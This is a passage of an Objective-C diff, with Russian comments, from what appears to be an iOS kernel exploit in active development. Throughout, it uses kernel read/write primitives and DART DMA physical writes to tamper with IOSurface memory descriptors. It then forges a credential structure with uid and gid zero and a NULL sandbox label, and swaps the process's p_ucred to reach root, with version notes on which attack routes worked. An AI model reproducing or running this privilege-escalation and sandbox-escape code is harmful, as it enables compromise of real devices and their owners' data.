+                if (kpLooksLikeKernelPointer(mapObj2) && kpSafeToRead(mapObj2)) { dva2 = early_kread64(mapObj2 + 0xa0); len2 = early_kread64(mapObj2 + 0xa8); }
+                kpNote(r, [NSString stringWithFormat:@"  [OPC] ps%d=%#llx surf=%#llx sid=%u cmd=%#llx DVA=%#llx len=%#llx",
+                          pi, (unsigned long long)ps, (unsigned long long)surf2, sid2, (unsigned long long)cmd2, (unsigned long long)dva2, (unsigned long long)len2]);
+                if (sid2 != dstID) continue;
+                uint64_t pd2 = kp_untag_ptr(early_kread64(surf2 + 0x30));
+                uint64_t spec2 = (kpLooksLikeKernelPointer(pd2) && kpSafeToRead(pd2)) ? kp_untag_ptr(early_kread64(pd2 + 0x60)) : 0;
+                if (!kpLooksLikeKernelPointer(spec2) || !kpSafeToRead(spec2)) continue;
+                uint64_t v = early_kread64(spec2 + 0x58);
+                kpNote(r, [NSString stringWithFormat:@"  [OPC] spec=%#llx +0x58=%#018llx (ждём pfn32=%#x)", (unsigned long long)spec2, (unsigned long long)v, pfn32]);
+                if ((uint32_t)v == pfn32) {
+                    uint64_t nq = (v & 0xffffffff00000000ULL) | ctlPFN;
+                    kpNote(r, [NSString stringWithFormat:@"  [OPC] ★ spec+0x58 через op-entry: %#018llx → %#018llx", (unsigned long long)v, (unsigned long long)nq]);
+                    usleep(2000);
+                    early_kwrite64(spec2 + 0x58, nq);
+                    uint64_t rb = early_kread64(spec2 + 0x58);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    specVA[nSpec] = spec2 + 0x58; specOld[nSpec] = v; nSpec++;
+                } else {
+                    for (uint32_t o = 0; o + 8 <= 0x64; o += 8)
+                        kpNote(r, [NSString stringWithFormat:@"    opc-spec+%#x: %#018llx", o, (unsigned long long)early_kread64(spec2 + o)]);
+                }
+            }
+        }
+    }
+    // 1.9.236 (р.57): КРИТИЧЕСКАЯ ПОПРАВКА — +0x58 работает только для type-0x30;
+    // наши desc = type-0x10, DART PA идёт из addr64-записей spec'а (entries
+    // {addr64,len64} stride 0x10 @ getPhysicalSegment 0x86ea394). Патч по
+    // ВЛАДЕНИЮ, не по значению: запись, чей kvtophys(VA)==backingPA → ctlKVA
+    // (map отрезолвит её в ctlPA). desc = plane-desc [IOSurface+0x30] (Q1).
+    // [planeDesc+0x20] & 0xf0 — type-check для протокола.
+    {
+        uint64_t pdX = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint32_t dtype = (kpLooksLikeKernelPointer(pdX) && kpSafeToRead(pdX)) ? (uint32_t)(early_kread64(pdX + 0x20) & 0xf0) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [DSX] planeDesc=%#llx type(0x20&0xf0)=0x%x", (unsigned long long)pdX, dtype]);
+        uint64_t specX = (kpLooksLikeKernelPointer(pdX) && kpSafeToRead(pdX)) ? kp_untag_ptr(early_kread64(pdX + 0x60)) : 0;
+        if (kpLooksLikeKernelPointer(specX) && kpSafeToRead(specX) && ctlKVA) {
+            int nPatched = 0;
+            for (uint32_t o = 0; o + 16 <= 0x70; o += 0x10) {
+                uint64_t addr = early_kread64(specX + o);
+                uint64_t len = early_kread64(specX + o + 8);
+                uint64_t pa = kpLooksLikeKernelPointer(addr) ? kvtophys(addr) : 0;
+                kpNote(r, [NSString stringWithFormat:@"    dsx entry+%#x: addr=%#018llx len=%#llx → PA %#llx%@",
+                          o, (unsigned long long)addr, (unsigned long long)len, (unsigned long long)pa,
+                          pa == backingPA ? @" ← НАША" : @""]);
+                if (pa == backingPA && nPatched < 4) {
+                    kpNote(r, [NSString stringWithFormat:@"    dsx ★ addr-запись НАШЕЙ страницы +%#x: %#018llx → ctlKVA %#llx",
+                              o, (unsigned long long)addr, (unsigned long long)ctlKVA]);
+                    usleep(2000);
+                    early_kwrite64(specX + o, ctlKVA);
+                    uint64_t rb = early_kread64(specX + o);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == ctlKVA ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    nPatched++;
+                }
+            }
+            if (!nPatched) kpNote(r, @"  [DSX] addr-записей с PA==backingPA нет (заполнение позже/другой объект)");
+        }
+    }
+    // 1.9.237: DSY — addr-записи [desc+0x60] все НУЛИ (type 0x10, но addr64=0 —
+    // это OFFSETS в бэкинг-стор, не VA). Базовый PA у РОДИТЕЛЯ: rangeObj =
+    // [IOSurface+0x178] = XPF-поле IOMemoryDescriptor_withAddressRanges_ref —
+    // root-MD бэкинга с ranges {addr64=PA, len}. Патч ranges[0].addr → ctlPA:
+    // prepare перестроит sub-MD с нашего PA, rewriter запишет его в desc+0x9c.
+    {
+        uint64_t ro237 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
+        uint64_t rovt = kpLooksLikeKernelPointer(ro237) ? kp_untag_ptr(early_kread64(ro237)) : 0;
+        uint64_t ks237 = kconstant(base) - 0xfffffff007004000ULL;
+        kpNote(r, [NSString stringWithFormat:@"  [DSY] rangeObj=%#llx vt(file)=%#llx (ждём 0x7b33db8)", (unsigned long long)ro237, (unsigned long long)(rovt ? rovt - ks237 : 0)]);
+        if (kpLooksLikeKernelPointer(ro237) && kpSafeToRead(ro237)) {
+            uint64_t arr237 = kp_untag_ptr(early_kread64(ro237 + 0x60));
+            uint32_t cnt237 = (uint32_t)early_kread64(ro237 + 0x68);
+            if (cnt237 > 0x400) cnt237 = 0x400;
+            kpNote(r, [NSString stringWithFormat:@"  [DSY] ranges=%#llx count=%u", (unsigned long long)arr237, cnt237]);
+            if (kpLooksLikeKernelPointer(arr237)) {
+                int nP237 = 0;
+                for (uint32_t i = 0; i < cnt237 && nP237 < 4; i++) {
+                    uint64_t addr = early_kread64(arr237 + (uint64_t)i * 16);
+                    uint64_t len = early_kread64(arr237 + (uint64_t)i * 16 + 8);
+                    kpNote(r, [NSString stringWithFormat:@"    dsy [%u]: addr=%#018llx len=%#llx%@", i, (unsigned long long)addr, (unsigned long long)len,
+                              addr == backingPA ? @" ← НАША" : @""]);
+                    if (addr == backingPA) {
+                        kpNote(r, [NSString stringWithFormat:@"    dsy ★ ranges[%u].addr → ctlPA %#llx", i, (unsigned long long)ctlPA]);
+                        usleep(2000);
+                        early_kwrite64(arr237 + (uint64_t)i * 16, ctlPA);
+                        uint64_t rb = early_kread64(arr237 + (uint64_t)i * 16);
+                        kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == ctlPA ? @"ПРИЛИПЛО" : @"МИМО"]);
+                        nP237++;
+                    }
+                }
+                if (!nP237) kpNote(r, @"  [DSY] addr==backingPA в rangeObj нет — база глубже (арена/root MD)");
+            }
+        }
+    }
+    // 1.9.224: spec+0x58 ПОСЛЕ execute#1 — пре-execute дамп (1.9.223) показал
+    // канарейки и random (+0x00=0): спек ЗАПОЛНЯЕТСЯ фабрикой при первом execute,
+    // а не при create/submit. Патчить надо ТУТ (pfn уже на месте) — retry возьмёт
+    // ctlPFN: rewriter перечитывает spec+0x58 КАЖДЫЙ execute (р.55).
+    {
+        uint64_t pdS2 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t specS2 = (kpLooksLikeKernelPointer(pdS2) && kpSafeToRead(pdS2)) ? kp_untag_ptr(early_kread64(pdS2 + 0x60)) : 0;
+        if (kpLooksLikeKernelPointer(specS2) && kpSafeToRead(specS2)) {
+            uint64_t v2 = early_kread64(specS2 + 0x58);
+            kpNote(r, [NSString stringWithFormat:@"  [SPC-post] spec+0x58=%#018llx (ждём pfn32=%#x)", (unsigned long long)v2, pfn32]);
+            if ((uint32_t)v2 == pfn32) {
+                if (!nSpec) {
+                    uint64_t nq = (v2 & 0xffffffff00000000ULL) | ctlPFN;
+                    kpNote(r, [NSString stringWithFormat:@"  [SPC-post] ★ spec заполнен — патч: %#018llx → %#018llx", (unsigned long long)v2, (unsigned long long)nq]);
+                    usleep(2000);
+                    early_kwrite64(specS2 + 0x58, nq);
+                    uint64_t rb = early_kread64(specS2 + 0x58);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    specVA[nSpec] = specS2 + 0x58; specOld[nSpec] = v2; nSpec++;
+                }
+            } else {
+                for (uint32_t o = 0; o + 8 <= 0x64; o += 8)
+                    kpNote(r, [NSString stringWithFormat:@"    spec-post+%#x: %#018llx", o, (unsigned long long)early_kread64(specS2 + o)]);
+            }
+        }
+    }
+    // 1.9.219: retry ×3 (было 8 — меньше окно яда и нагрузка на мину); форма4 из
+    // массива уже нет; DEP-хиты восстанавливаем после КАЖДОЙ попытки (яд живёт
+    // только в окне execute, не секундами — урок prev-12).
+    for (int attempt = 1; !changed && attempt < 4; attempt++) {
+        for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], newQs[j]);
+        for (int k = 0; k < nSpec; k++) {
+            uint64_t cur = early_kread64(specVA[k]);
+            if (!specOld[k]) specOld[k] = cur;   // 1.9.231: первый живой pfn как restore-оригинал (specOld=0 был маркером)
+            early_kwrite64(specVA[k], (cur & 0xffffffff00000000ULL) | ctlPFN);
+        }
+        for (int i = 0; i < nDep; i++) {
+            if (hitForm[i] < 0 || hitForm[i] == 4) continue;
+            uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | ctlPA)
+                        : (hitForm[i] == 3) ? (((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL))
+                        : (hitForm[i] == 5) ? ((hitOld[i] & 0xffffffff00000000ULL) | ctlPFN)
+                        : (uint64_t)ctlPFN;
+            early_kwrite64(hitAddr[i], nq);
+        }
+        kern_return_t rkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
+        usleep(400000);
+        for (uint32_t i = 0; i < 0x4000; i += 4) {
+            uint32_t px = *(volatile uint32_t *)(ctl + i);
+            if (px != 0xCCCCCCCC && px != 0) changed++;
+        }
+        uint64_t cur0 = nSlots ? early_kread64(slotVAs[0]) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [RETRY #%d] submit kr=0x%x ctl-changed=%d слот#0=%#018llx",
+                  attempt, rkr, changed, (unsigned long long)cur0]);
+        // 1.9.248: дамп record buffer ПОСЛЕ submit — решает H1/H2 из 247-й:
+        // entry0 вернулся к оригиналу = rebuild перезаписал яд (H1, источник
+        // глубже — wire-layer); entry0 == ctlPFN = mapper игнорирует буфер (H2).
+        // 1.9.250 (р.62): bit1 SET = stale-ветка (entries не читаются), bit1
+        // CLEAR = сериализатор читает entries. Откат = пересборка из wire list.
+        if (buf247) {
+            uint8_t f2 = 0; kreadbuf(buf247 + 0x2d, &f2, 1);
+            uint64_t e0 = early_kread64(buf247 + 0x30);
+            uint64_t e1 = early_kread64(buf247 + 0x38);
+            kpNote(r, [NSString stringWithFormat:@"      buffer пост-submit: flags=%#x entry0=%#018llx entry1=%#018llx — %@",
+                      f2, (unsigned long long)e0, (unsigned long long)e1,
+                      changed ? @"ЗАПИСЬ ПРОШЛА — сериализатор прочитал яд ✓ (р.62 подтверждён на железе)" :
+                      (uint32_t)e0 == ctlPFN ? @"яд НА МЕСТЕ (entries не прочитаны: stale-ветка/sanity — копаем [desc+0x88] wire list)" :
+                      (uint32_t)e0 == pfn32 ? @"ОТКАТ в оригинал (пересборка из wire list [desc+0x88] — следующая цель)" : @"ТРЕТЬЕ ЗНАЧЕНИЕ"]);
+        }
+        if (!changed) {
+            for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], origQs[j]);
+            for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
+            for (int k = 0; k < nSpec; k++) if (specOld[k]) early_kwrite64(specVA[k], specOld[k]);
+        }
+    }
+    // restore всех пропатченных слотов (порт-маршрут или одиночный ranges)
+    for (int j = 0; j < nSlots; j++)
+        early_kwrite64(slotVAs[j], origQs[j]);
+    // 1.9.219: финальный restore DEP-хитов ВСЕГДА (яд не живёт дольше теста)
+    for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
+    // 1.9.222: финальный restore spec (яд не живёт дольше теста)
+    if (!changed) for (int k = 0; k < nSpec; k++) if (specOld[k]) early_kwrite64(specVA[k], specOld[k]);
+    // 1.9.248: финальный restore records-built flags (кворд +0x28 целиком — count не тронут)
+    if (buf247 && flOld247) early_kwrite64(buf247 + 0x28, flOld247);
+    // 1.9.198: restore VA-поля буфера (teardown-safety)
+    if (vaFldObj) {
+        early_kwrite64(vaFldObj + vaFldOff, vaFldOld);
+        uint64_t rb4 = early_kread64(vaFldObj + vaFldOff);
+        kpNote(r, [NSString stringWithFormat:@"  [VAD] restore VA-поля: %#018llx — %@", (unsigned long long)rb4,
+                  rb4 == vaFldOld ? @"вернули оригинал" : @"НЕ вернулось"]);
+    }
+    // 1.9.202: restore записи арены
+    if (parHitArr) {
+        early_kwrite64(parHitArr + parHitOff, parHitOld);
+        uint64_t rb6 = early_kread64(parHitArr + parHitOff);
+        kpNote(r, [NSString stringWithFormat:@"  [PAR] restore записи арены: %#018llx — %@", (unsigned long long)rb6,
+                  rb6 == parHitOld ? @"вернули оригинал" : @"НЕ вернулось"]);
+    }
+    // 1.9.207: restore базы owner-MD
+    if (ownHitArr) {
+        early_kwrite64(ownHitArr + ownHitOff, ownHitOld);
+        uint64_t rb9 = early_kread64(ownHitArr + ownHitOff);
+        kpNote(r, [NSString stringWithFormat:@"  [OWN] restore базы owner-MD: %#018llx — %@", (unsigned long long)rb9,
+                  rb9 == ownHitOld ? @"вернули оригинал" : @"НЕ вернулось"]);
+    }
+    // 1.9.211: restore page-list root-MD
+    if (rmdHitArr) {
+        early_kwrite64(rmdHitArr + rmdHitOff, rmdHitOld);
+        uint64_t rb10 = early_kread64(rmdHitArr + rmdHitOff);
+        kpNote(r, [NSString stringWithFormat:@"  [RMD] restore page-list: %#018llx — %@", (unsigned long long)rb10,
+                  rb10 == rmdHitOld ? @"вернули оригинал" : @"НЕ вернулось"]);
+    }
+    if (changed) {
+        kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===", changed]);
+        // 1.9.208: ФОРЖ UCRED — тот же physwrite, цель = страница нашего ucred.
+        // Карта р.18: cr_uid/ruid/svuid +0x18/1c/20, groups[0] +0x28, rgid/svgid
+        // +0x68/6c, cr_label +0x78 → NULL (sandbox off). DART пишет мимо SPTM RO.
+        {
+            uint64_t prF = 0, roF = 0, ucF = 0;
+            if (selfProcM) {
+                prF = early_kread64(selfProcM + koffsetof(proc, proc_ro));
+                roF = prF ? kp_untag_ptr(prF) : 0;
+                ucF = roF ? kp_untag_ptr(early_kread64(roF + koffsetof(proc_ro, ucred))) : 0;
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [FORGE] proc_ro=%#llx ucred=%#llx (getuid=%u getgid=%u)",
+                      (unsigned long long)roF, (unsigned long long)ucF, getuid(), getgid()]);
+            if (kpLooksLikeKernelPointer(ucF)) {
+                uint64_t pageVA = ucF & ~0x3fffULL;
+                uint32_t uoff = (uint32_t)(ucF & 0x3fff);
+                uint64_t pagePA = kvtophys(pageVA);
+                int errF = errno;
+                // 1.9.273: PAPT-override в авто-цепи не установлен (EXP-03 живёт в
+                // кнопке дампа), а сток-точка на 18.6 = stub → kpZoneVtoP падал с 0.
+                // Контент-охота прямо здесь (р.63/69: zone-map покрыт резолвером
+                // ядра — таблица существует). 24-B формат: {PA, VA, npages}.
+                if (!pagePA && !kp_papt_table_va) {
+                    // 1.9.275: ДИАГНОСТИКА охоты — сначала дамп сток-таблицы: что
+                    // реально лежит в [libsptm_papt_ranges] (stub или настоящая) и
+                    // сколько записей считает резолвер. Потом по контенту.
+                    uint64_t stockN = kread32(kread64(ksymbol(libsptm_n_papt_ranges)));
+                    uint64_t stockT = kread_ptr(ksymbol(libsptm_papt_ranges));
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] PAPT сток: tbl=%#llx n=%llu", (unsigned long long)stockT, (unsigned long long)stockN]);
+                    if (kpLooksLikeKernelPointer(stockT)) {
+                        // 1.9.276: early_kread64 — таблица в SPTM-прилегающем регионе,
+                        // kpRead резал её EL2-гардом (275-я «чтение = паника, пропуск»).
+                        uint64_t q0 = early_kread64(stockT), q1 = early_kread64(stockT + 8), q2 = early_kread64(stockT + 16);
+                        kpNote(r, [NSString stringWithFormat:@"    stock[0]: %#018llx %#018llx %#018llx",
+                                  (unsigned long long)q0, (unsigned long long)q1, (unsigned long long)q2]);
+                    }
+                    NSArray<NSNumber *> *pts = [self libsptmBlockPointeesWithLog:nil];
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] PAPT охота: %d pointee-кандидатов", (int)pts.count]);
+                    for (NSNumber *pv in pts) {
+                        uint64_t cand = pv.unsignedLongLongValue;
+                        uint8_t f2[48];
+                        memset(f2, 0, sizeof(f2));
+                        for (uint32_t ri = 0; ri < 48; ri += 8) *(uint64_t *)(f2 + ri) = early_kread64(cand + ri);   // 1.9.276: early_kread64 напрямую — EL2-гард kpRead резал pointee'ы (275-я)
+                        BOOL ok24 = kpPaptEntryPlausible(f2) && kpPaptEntryPlausible(f2 + 24);
+                        if (!ok24) {
+                            // 16-B формат: {va_base, start_pfn(u32)@8, count(u24)@12} — записи с +8
+                            uint64_t vb = 0; uint32_t sp = 0, rc = 0;
+                            memcpy(&vb, f2 + 8, 8); memcpy(&sp, f2 + 16, 4); memcpy(&rc, f2 + 20, 4);
+                            if (kpLooksLikeKernelPointer(vb) && sp && (rc & 0xFFFFFF) && (rc & 0xFFFFFF) < 0x80000) {
+                                ok24 = YES; kp_papt_format = 1;
+                            }
+                        }
+                        if (ok24) {
+                            kp_papt_table_va = cand;
+                            kp_papt_table_n = stockN ? stockN : 96;
+                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] PAPT найдена @ %#llx (fmt=%s n=%llu)",
+                                      (unsigned long long)cand, kp_papt_format ? "16-B" : "24-B", (unsigned long long)kp_papt_table_n]);
+                            break;
+                        }
+                    }
+                    if (!kp_papt_table_va) kpNote(r, @"  [FORGE] PAPT охота: ни один кандидат не прошёл валидацию");
+                }
+                // 1.9.251 (р.63): walker ветки VM/RO охраняется deadly-таблицами
+                // (census 0x15) → pagePA=0. Fallback — PAPT/арена ядра (kpZoneVtoP).
+                if (!pagePA) pagePA = kpZoneVtoP(pageVA);
+                // 1.9.252: walker встал на deadly-таблице (errno 1042) — читаем её
+                // через DART-копию (kpPhysRead16K), leaf PTE сама отдаёт ucredPA.
+                if (!pagePA && errF == 1042 && kp_lastDeadlyTte && isTable && svc) {
+                    uint64_t tpage = kp_lastDeadlyTte & ~0x3fffULL;
+                    uint32_t tidx = (uint32_t)(kp_lastDeadlyTte & 0x3fff) / 8;
+                    uint8_t timg[0x4000];
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — physread через DART",
+                              kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte]);
+                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, tpage, timg, r)) {
+                        uint64_t pte = 0; memcpy(&pte, timg + (uint64_t)tidx * 8, 8);
+                        if (kp_lastDeadlyLvl == 2 && (pte & 0x3) == 0x3) {   // L2-запись → L3 таблица
+                            uint64_t l3pa = pte & 0x0000ffffffffc000ULL;
+                            uint32_t l3idx = (uint32_t)((pageVA >> 14) & 0x7ff);
+                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] L2[%u] → L3 таблица %#llx, читаю её", tidx, (unsigned long long)l3pa]);
+                            if (!kpPhysRead16K(svc, tsdV, ttM, isTable, l3pa, timg, r)) pte = 0;
+                            else memcpy(&pte, timg + (uint64_t)l3idx * 8, 8);
+                        }
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] leaf PTE = %#018llx", pte]);
+                        if ((pte & 0x3) == 0x3) pagePA = pte & 0x0000ffffffffc000ULL;
+                    }
+                }
+                // 1.9.277: ВЫКЛ — репоинт ucredVA мёртв: TLB-стэйл не вымывается
+                // (р.70 Q3; 272b/276 — 10 эвиктов × 2 прогона, getuid=501 стабильно).
+                // ucredPA нужен для контент-форжа — его даёт [FRESH] ниже.
+                if (0 && !pagePA && kp_lastDeadlyTte && isTable && svc && ttM) {
+                    uint64_t tpage = kp_lastDeadlyTte & ~0x3fffULL;
+                    uint32_t tidx = (uint32_t)(kp_lastDeadlyTte & 0x3fff) / 8;
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — L3-инжекция ucred",
+                              kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte]);
+                    uint8_t *fk = valloc(0x4000);
+                    for (uint32_t i = 0; i < 0x4000; i += 8) *(uint64_t *)(fk + i) = early_kread64(pageVA + i);
+                    *(uint32_t *)(fk + uoff + 0x18) = 0;   // cr_uid
+                    *(uint32_t *)(fk + uoff + 0x1c) = 0;   // cr_ruid
+                    *(uint32_t *)(fk + uoff + 0x20) = 0;   // cr_svuid
+                    *(uint32_t *)(fk + uoff + 0x28) = 0;   // cr_groups[0]
+                    *(uint32_t *)(fk + uoff + 0x68) = 0;   // cr_rgid
+                    *(uint32_t *)(fk + uoff + 0x6c) = 0;   // cr_svgid
+                    *(uint64_t *)(fk + uoff + 0x78) = 0;   // cr_label = NULL (sandbox off)
+                    mlock(fk, 0x4000);   // страница обязана остаться — ядро читает её как ucred
+                    uint64_t fkPA = vtophys(ttM, (uint64_t)fk);
+                    uint64_t pteSrc = 0;
+                    if (selfProcM) {
+                        uint64_t lvl = 3, lt = 0;
+                        uint64_t gpa = vtophys_lvl(kconstant(cpuTTEP), kp_untag_ptr(selfProcM), &lvl, &lt);
+                        if (gpa && lt) pteSrc = early_kread64(phystokv(lt));
+                    }
+                    if (fkPA && (pteSrc & 0x3) == 0x3) {
+                        uint64_t newPTE = (fkPA & 0x0000ffffffffc000ULL) | (pteSrc & ~0x0000ffffffffc000ULL);
+                        BOOL wOK = kpPhysWrite8v2(svc, tsdV, ttM, isTable, tpage, tidx * 8, newPTE, r);
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] L3[%u] = %#018llx — инжекция: %@ — churn TLB…",
+                                  tidx, (unsigned long long)newPTE, wOK ? @"ЗАПИСАНО" : @"МИМО"]);
+                        uid_t gu = 501; gid_t gg = 501; uint32_t cru = 501;
+                        NSDictionary *spC = @{(__bridge id)kIOSurfaceWidth: @64, (__bridge id)kIOSurfaceHeight: @64,
+                                              (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
+                        // 1.9.273: потоки-поллеры getuid() (свежий CPU → новая таблица → 0),
+                        // main churn'ит. Любой увидевший 0 = победа.
+                        atomic_store(&gEvictHit, 0);
+                        pthread_t evT[4];
+                        for (int t = 0; t < 4; t++) pthread_create(&evT[t], NULL, kpEvictWorker, NULL);
+                        for (int ev = 0; ev < 10 && !atomic_load(&gEvictHit); ev++) {
+                            size_t big = 256 * 1024 * 1024;
+                            uint8_t *bigp = mmap(NULL, big, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
+                            if (bigp != MAP_FAILED) {
+                                for (uint64_t o = 0; o < big; o += 0x4000) bigp[o] = 1;
+                                munmap(bigp, big);
+                            }
+                            for (int c = 0; c < 800; c++) { IOSurfaceRef cs = IOSurfaceCreate((__bridge CFDictionaryRef)spC); if (cs) CFRelease(cs); }
+                            usleep(500000);
+                            gu = getuid(); gg = getgid(); cru = (uint32_t)early_kread64(ucF + 0x18);
+                            if (gu == 0) atomic_store(&gEvictHit, 1);
+                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] ev#%d: getuid()=%u cr_uid=%u pollers=%d", ev, gu, cru, atomic_load(&gEvictHit)]);
+                        }
+                        if (atomic_load(&gEvictHit)) gu = 0;
+                        for (int t = 0; t < 4; t++) pthread_join(evT[t], NULL);
+                        uint64_t lbl = early_kread64(ucF + 0x78);
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] getuid()=%u getgid()=%u | cr_uid=%u cr_label=%#llx",
+                                  gu, gg, cru, (unsigned long long)lbl]);
+                        if (gu == 0 || atomic_load(&gEvictHit)) {   // 1.9.273: победа и с поллеров на свежих CPU
+                            kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — L3-инжекция ucred через DART physwrite (мимо SPTM RO) ===");
+                            FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
+                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] sandbox-проба (запись в /var/mobile): %@",
+                                      fp ? @"УСПЕХ — label снят, песочницы нет" : @"ОТКАЗ — label на месте"]);
+                            if (fp) { fputs("root via DART L3 injection\n", fp); fclose(fp); }
+                        }
+                    } else {
+                        kpNote(r, @"  [FORGE] fkPA/pteSrc не сошлись — инжекции нет");
+                    }
+                    // fk НЕ освобождаем (сознательный leak — ucredVA указывает на неё)
+                    (void)fk;
+                }
+                // 1.9.278 (р.70/71): ucredPA мёртв насовсем — pv для kernel_pmap не
+                // существует (pmap_enter_options skip @ 0x8155090), frame-table без
+                // back-pointer, CTRR фенсит ro_pagetables от DMA, blind-probe свежих
+                // kernel VA = паника в kernel-контексте (р.71 Q4). Выживший маршрут —
+                // P_UCRED SWAP через physmap-форж: поле в proc_ro читается (276), PA
+                // поля даёт walker (нашего proc таблицы недeadly — pteSrc читался).
+                // Форж = копия ucred на НАШЕЙ странице (uid/gid=0, label=NULL);
+                // p_ucred переписываем physmap-алиасом одним DART physwrite8.
+                // Никаких правок таблиц, TLB-игр и deadly-чтений.
+                BOOL pswapRoot = NO;
+                {
+                    uint64_t ucFieldVA = roF + koffsetof(proc_ro, ucred);
+                    uint64_t lvlP = 3, ltP = 0;
+                    uint64_t ucFieldPA = vtophys_lvl(kconstant(cpuTTEP), ucFieldVA, &lvlP, &ltP);
+                    kpNote(r, [NSString stringWithFormat:@"  [PSWAP] p_ucred field: VA=%#llx PA=%#llx (walk %@)",
+                              (unsigned long long)ucFieldVA, (unsigned long long)ucFieldPA, ucFieldPA ? @"ok" : @"deadly — мимо"]);
+                    if (ucFieldPA && svc && ttM && isTable) {
+                        uint8_t *fp2 = valloc(0x4000);
+                        for (uint32_t i = 0; i < 0x100; i += 8) *(uint64_t *)(fp2 + i) = early_kread64(ucF + i);
+                        *(uint32_t *)(fp2 + 0x18) = 0;  // cr_uid
+                        *(uint32_t *)(fp2 + 0x1c) = 0;  // cr_ruid
+                        *(uint32_t *)(fp2 + 0x20) = 0;  // cr_svuid
+                        *(uint32_t *)(fp2 + 0x28) = 0;  // cr_groups[0]
+                        *(uint32_t *)(fp2 + 0x68) = 0;  // cr_rgid
+                        *(uint32_t *)(fp2 + 0x6c) = 0;  // cr_svgid
+                        *(uint64_t *)(fp2 + 0x78) = 0;  // cr_label = NULL → sandbox off
+                        mlock(fp2, 0x4000);
+                        uint64_t fpPA = vtophys(ttM, (uint64_t)fp2);
+                        uint64_t fpKVA = fpPA ? phystokv(fpPA) : 0;
+                        kpNote(r, [NSString stringWithFormat:@"  [PSWAP] forge page: PA=%#llx KVA=%#llx",
+                                  (unsigned long long)fpPA, (unsigned long long)fpKVA]);
+                        if (fpKVA && kpLooksLikeKernelPointer(fpKVA)) {
+                            BOOL wP = kpPhysWrite8v2(svc, tsdV, ttM, isTable, ucFieldPA & ~0x3fffULL,
+                                                     (uint32_t)(ucFieldPA & 0x3fff), fpKVA, r);
+                            uint64_t rb = early_kread64(ucFieldVA);
+                            kpNote(r, [NSString stringWithFormat:@"  [PSWAP] запись=%@ readback=%#llx (ждём %#llx) → %@",
+                                      wP ? @"kr=0" : @"МИМО", (unsigned long long)rb, (unsigned long long)fpKVA,
+                                      rb == fpKVA ? @"P_UCRED ПЕРЕКЛЮЧЁН ✓" : @"НЕ ПРИЛИПЛО"]);
+                            if (rb == fpKVA) {
+                                uid_t gu = getuid(); gid_t gg = getgid();
+                                kpNote(r, [NSString stringWithFormat:@"  [PSWAP] getuid()=%u getgid()=%u", gu, gg]);
+                                if (gu == 0) {
+                                    kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — p_ucred swap через DART physwrite (physmap-форж, мимо SPTM RO) ===");
+                                    FILE *fpf = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
+                                    kpNote(r, [NSString stringWithFormat:@"  [PSWAP] sandbox-проба (запись в /var/mobile): %@",
+                                              fpf ? @"УСПЕХ — label снят, песочницы нет" : @"ОТКАЗ"]);
+                                    if (fpf) { fputs("root via p_ucred swap\n", fpf); fclose(fpf); }
+                                    pswapRoot = YES;
+                                }
+                                usleep(1000000);   // секунда root-состояния на пробы
+                                kpPhysWrite8v2(svc, tsdV, ttM, isTable, ucFieldPA & ~0x3fffULL,
+                                               (uint32_t)(ucFieldPA & 0x3fff), ucF, r);   // restore оригинала
+                                kpNote(r, [NSString stringWithFormat:@"  [PSWAP] restore: readback=%#llx (ждём %#llx)",
+                                          (unsigned long long)early_kread64(ucFieldVA), (unsigned long long)ucF]);
+                            }
+                        }
+                        munlock(fp2, 0x4000); free(fp2);   // безопасно: p_ucred уже возвращён
+                    }
